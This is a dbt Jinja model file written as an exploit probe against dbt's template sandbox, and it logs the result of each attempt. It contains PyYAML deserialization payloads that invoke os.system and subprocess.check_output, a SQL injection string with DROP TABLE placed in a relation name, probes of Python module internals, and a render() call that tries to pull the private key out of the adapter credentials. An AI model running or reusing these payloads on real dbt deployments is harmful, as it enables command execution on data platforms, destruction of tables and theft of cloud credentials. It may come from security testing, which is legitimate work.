{# Module-level code execution attempts + adapter.execute probe #}

{# 1. Try adapter.execute directly - bypass compile execute flag #}
{%- set exec_result = adapter.execute("SELECT 1 as test_col") -%}
{{ log("ADAPTER_EXEC_RESULT=" ~ exec_result | string | truncate(500), info=True) }}
{{ log("ADAPTER_EXEC_TYPE=" ~ exec_result.__class__.__name__ if exec_result.__class__ is defined else 'unknown', info=True) }}

{# 2. Try adapter.list_schemas #}
{%- set schemas = adapter.list_schemas("test-project-ssrf") -%}
{{ log("ADAPTER_LIST_SCHEMAS=" ~ schemas | string | truncate(500), info=True) }}

{# 3. re.Pattern.scanner - can it access internals? #}
{%- set pat = modules.re.compile('(\\w+)') -%}
{%- set scanner = pat.scanner('hello world test') -%}
{{ log("SCANNER_TYPE=" ~ scanner | string | truncate(200), info=True) }}
{%- set scanner_match = scanner.match() -%}
{{ log("SCANNER_MATCH=" ~ scanner_match | string | truncate(200), info=True) }}

{# 4. Try to access re module's internal _compile via different path #}
{%- set template_obj = modules.re.template('test') -%}
{{ log("RE_TEMPLATE_TYPE=" ~ template_obj | string | truncate(200), info=True) }}

{# 5. Check if any module has __file__ accessible #}
{%- for mod_name in ['re', 'datetime', 'pytz', 'itertools'] -%}
  {%- set mod = modules[mod_name] -%}
  {%- set file_attr = mod.__file__ if mod.__file__ is defined else 'NO_FILE' -%}
  {{ log("MODULE_" ~ mod_name ~ "_FILE=" ~ file_attr, info=True) }}
{%- endfor -%}

{# 6. Try fromyaml with crafted YAML that might trigger deserialization #}
{# PyYAML has known deserialization vulnerabilities #}
{%- set yaml_str = "!!python/object/apply:os.system ['id']" -%}
{%- set yaml_parsed = fromyaml(yaml_str) -%}
{{ log("YAML_DESER_RESULT=" ~ yaml_parsed | string | truncate(200), info=True) }}

{# 7. Try a different YAML deserialization payload #}
{%- set yaml_str2 = "!!python/object/new:subprocess.check_output [['id']]" -%}
{%- set yaml_parsed2 = fromyaml(yaml_str2) -%}
{{ log("YAML_DESER2_RESULT=" ~ yaml_parsed2 | string | truncate(200), info=True) }}

{# 8. Try !!python/name payload #}
{%- set yaml_str3 = "!!python/name:os.system" -%}
{%- set yaml_parsed3 = fromyaml(yaml_str3) -%}
{{ log("YAML_DESER3_RESULT=" ~ yaml_parsed3 | string | truncate(200), info=True) }}

{# 9. Probe adapter.Relation for SQL injection in relation names #}
{{ log("ADAPTER_RELATION=" ~ adapter.Relation | string | truncate(200), info=True) }}
{%- set rel = adapter.Relation.create(database='test', schema='public', identifier="x'; DROP TABLE students; --") -%}
{{ log("CRAFTED_RELATION=" ~ rel | string | truncate(200), info=True) }}

{# 10. Try render() with template that references internal variables #}
{%- set render_test = render("{{ adapter.config.credentials.keyfile_json.get('private_key', 'nope') }}") -%}
{{ log("RENDER_CRED_TEST=" ~ render_test | truncate(200), info=True) }}

SELECT 1 as id
